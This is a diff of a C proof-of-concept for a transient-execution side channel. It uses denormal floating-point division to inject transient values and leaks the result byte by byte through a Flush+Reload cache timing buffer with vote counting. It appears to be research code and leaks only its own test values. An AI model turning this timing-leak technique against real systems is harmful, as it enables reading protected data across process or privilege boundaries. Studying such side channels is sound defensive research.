@@ -52,9 +52,9 @@ static __always_inline double make_denormal(uint64_t bits){
 }
 
 static __always_inline void fpvi(double *denormalX, double *denormalY, unsigned char *buff, uint8_t leak_offset){
+    // Prevent speculation by branch (maybe hacky but for debug)
     asm volatile(      
-        // Repeat the leak a few times
-        "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
+        // Repeat the leak a few times (maybe try different pairs of registers to avoid the slow mov)
         "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
         "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
         "movq (%0), %%xmm0\nmovq (%1), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
@@ -62,12 +62,24 @@ static __always_inline void fpvi(double *denormalX, double *denormalY, unsigned 
 
         // Leak Transient result byte
         "movq %%xmm0,%%rax\nshr %%cl, %%rax\n"
-
         "andq $0xff, %%rax\n"       // Mask out everything but the 1st byte
         "shlq $12, %%rax\n"         // Multiply by 4096 (page size)
         "movq (%2, %%rax), %%rax\n" // Touch timing_buff_0
         ::"r"(denormalX), "r"(denormalY), "r"(buff), "c"(leak_offset*8):"rax","xmm0","xmm1"
     );
+}
+
+static __always_inline uint64_t archictectural(double *denormalX, double *denormalY){
+    uint64_t out;
+    asm volatile(      
+        // Repeat the leak a few times
+        "movq (%1), %%xmm0\nmovq (%2), %%xmm1\ndivsd %%xmm1,%%xmm0\n" // Setup Operands, do div
+
+        // Leak Transient result byte
+        "movq %%xmm0,%0\n"
+        :"=r"(out):"r"(denormalX),"r"(denormalY):"xmm0","xmm1"
+    );
+    return out;
 }
 
 void probe_buffer(int stride, int cutoff, unsigned char *buff, int votes[256]){
@@ -90,19 +102,18 @@ void probe_buffer(int stride, int cutoff, unsigned char *buff, int votes[256]){
 
 
 // --- Constants for Optimization ---
-#define MAX_REPETITIONS 1000  // Increased max, but we exit early
-#define CHECK_INTERVAL 5     // Check for success every N reps
-#define MIN_VOTES 5           // Minimum votes required to consider a winner
+#define MAX_REPETITIONS 2000  // Increased max, but we exit early
+#define CHECK_INTERVAL 10     // Check for success every N reps
+#define MIN_VOTES 10           // Minimum votes required to consider a winner
 #define WIN_MARGIN 2          // Winner must have 2x the votes of the runner-up
 
-
-// Returns the index of the winner, or -1 if no clear winner yet
-int check_winner(int votes[256]) {
+int check_winner(int votes[256], int avoid) {
     int max_v = -1;
     int max_i = -1;
     int runner_up_v = -1;
 
     for (int i = 0; i < 256; i++) {
+        if (i==avoid) continue;
         if (votes[i] > max_v) {
             runner_up_v = max_v;
             max_v = votes[i];
@@ -121,20 +132,71 @@ int check_winner(int votes[256]) {
     return -1;
 }
 
-unsigned char interpret_votes(int votes[256]){
+// Returns the index of the winner, or -1 if no clear winner yet.
+// If the top candidate equals `avoid`, we prefer the runner-up.
+int check_winner_avoid_2(int votes[256], int avoid) {
+    printf("[$] Avoiding %x\n",avoid );
+    int max_v = -1;
+    int max_i = -1;
+    int runner_up_v = -1;
+    int runner_up_i = -1;
+
+    for (int i = 0; i < 256; i++) {
+        if (i == avoid) continue;
+        int v = votes[i];
+        if (v > max_v) {
+            runner_up_v = max_v;
+            runner_up_i = max_i;
+            max_v = v;
+            max_i = i;
+        } else if (v > runner_up_v) {
+            runner_up_v = v;
+            runner_up_i = i;
+        }
+    }
+
+    if (max_v < MIN_VOTES) {
+        return -1;
+    }
+
+    if (max_i != avoid) {
+        if (runner_up_v == 0 || (max_v / (runner_up_v + 1) >= WIN_MARGIN)) {
+            return max_i;
+        }
+        return -1;
+    }
+
+    if (runner_up_i == -1) {
+        return -1;  // nothing better
+    }
+
+    if (runner_up_v >= MIN_VOTES) {
+        return runner_up_i;
+    }
+
+    return -1;
+}
+
+unsigned char interpret_votes(int votes[256], int avoid){
+    // printf("[%%] Tallying votes: ");
+
     unsigned char most_votes = 0;
     int max_v = 0;
     for (int i=0; i<256; i++) {
+        // if (votes[i] > 0 || i==avoid) printf("[%02x, %d] ", i, votes[i]);
+        // if (i==avoid) printf("<< IGNORING ");
+        if (i==avoid) continue;
         if (votes[i] > max_v) {
             max_v = votes[i];
             most_votes = i;
         }
     }
+    // printf("\n");
     return most_votes;
 }
 
 
-char collect_value(uint8_t index, int stride, int cutoff, double denormalX, double denormalY, unsigned char *buff){
+char collect_value(uint8_t index, int stride, int cutoff, double denormalX, double denormalY, unsigned char avoid, unsigned char *buff){
     int votes_0[256] = {0};
 
     int finalized = -1;
@@ -142,6 +204,8 @@ char collect_value(uint8_t index, int stride, int cutoff, double denormalX, doub
     for (int r=0;r<MAX_REPETITIONS;r++){
         flush_all(buff, stride);
 
+        // Maybe try repeating this
+        fpvi(&denormalX, &denormalY, buff, index);
         fpvi(&denormalX, &denormalY, buff, index);
 
         asm volatile("mfence\n");
@@ -150,7 +214,7 @@ char collect_value(uint8_t index, int stride, int cutoff, double denormalX, doub
 
         // Only check every few rounds to save CPU cycles on the check logic itself
         if (r > 10 && r % CHECK_INTERVAL == 0) {
-            if (finalized == -1) finalized = check_winner(votes_0);
+            if (finalized == -1) finalized = check_winner(votes_0, (int)avoid);
 
             if (finalized != -1) {
                 break;
@@ -158,7 +222,7 @@ char collect_value(uint8_t index, int stride, int cutoff, double denormalX, doub
         }
     }
 
-    return (finalized != -1) ? finalized : interpret_votes(votes_0);
+    return (finalized != -1) ? finalized : interpret_votes(votes_0, (int)avoid);
 }
 
 #define STRIDE 4096
@@ -175,6 +239,7 @@ uint64_t GetTimeStamp() {
 
 int main(){
     unsigned char leaked[sizeof(double)] = {0};
+    // Try to use several buffs
     unsigned char *timing_buff = (unsigned char *)mmap(NULL, 2*4096*256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);
 
     if (timing_buff == MAP_FAILED) {
@@ -189,18 +254,35 @@ int main(){
     double denormalY = make_denormal(get_random_bits());
     uint64_t checkY; memcpy(&checkY, &denormalY, sizeof(checkX));
 
-    printf("[=] Leaking Denormed X/Y:\n");
-    printf(" |- Denormed X: %a (%016" PRIx64 ")\n |- Denormed Y: %a (%016" PRIx64 ")\n", denormalX,checkX, denormalY,checkY);
+    uint64_t arch = archictectural(&denormalX, &denormalY);
+    unsigned char *arch_bytes = (unsigned char *)&arch;
+    char fallbacks[sizeof(uint64_t)] = {0};
 
+    printf("[%%] Leaking Denormed X/Y:\n");
+    printf(" |- Denormed X: %a (0x%016" PRIx64 ")\n |- Denormed Y: %a (0x%016" PRIx64 ")\n", denormalX, checkX, denormalY, checkY);
     uint64_t s0 = GetTimeStamp();
     for (uint8_t index=0;index<sizeof(double);index++) {
-        leaked[index] = collect_value(index, STRIDE, 160, denormalX, denormalY, timing_buff);
+        char leak = collect_value(index, STRIDE, 160, denormalX, denormalY, arch_bytes[index], timing_buff);
+        if (leak==arch_bytes[index] || leak==0x0) {
+            leaked[index] = collect_value(index, STRIDE, 160, denormalX, denormalY, 0, timing_buff);;
+            fallbacks[index] = 1;
+        } else {
+            leaked[index] = leak;
+            fallbacks[index] = 0;
+        }
     }
     uint64_t sp = GetTimeStamp();
 
-    printf("[#] Got: ");
-    for (int i=0;i<sizeof(double);i++) printf("%02x", leaked[i]);
-    printf("\n |- Took %ld us\n", sp - s0);
-    
+    printf("\n[#] Arch.:  0x%016" PRIx64 "\n", arch);
+    printf(" |- Trans.: 0x%016" PRIx64 "\n", *(uint64_t *)&leaked);
+    // for (int i=sizeof(uint64_t);i>=0;i--) {
+    //     if (fallbacks[i] == 1) {
+    //         printf("^^");
+    //     } else {
+    //         printf("  ");
+    //     }
+    // }
+    printf("\n [~] Took %ld us\n", sp - s0);
+
     return 0;
 }
